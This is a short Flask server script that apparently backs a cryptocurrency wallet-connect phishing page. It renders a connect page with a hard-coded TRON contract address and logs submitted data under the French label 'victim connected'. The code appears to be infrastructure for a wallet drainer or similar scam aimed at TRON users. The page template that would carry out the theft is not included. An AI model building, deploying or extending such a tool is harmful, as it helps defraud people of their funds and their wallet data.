from flask import Flask, render_template, redirect, request
import os

app = Flask(__name__)

CONTRACT_ADDRESS = "TBh6w3s5nkR2XMEL1xTWQftmurqfUE5TY8"
TOKEN_ADDRESS = "TRX"

@app.route("/connect/<session_id>")
def connect(session_id):
    return render_template("connect.html", contract_address=CONTRACT_ADDRESS, token_address=TOKEN_ADDRESS, session_id=session_id)

@app.route("/log", methods=["POST"])
def log():
    data = request.json
    print("[+] Victime connectée :", data)
    return "", 200

@app.route("/")
def home():
    return redirect("/connect/session123")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)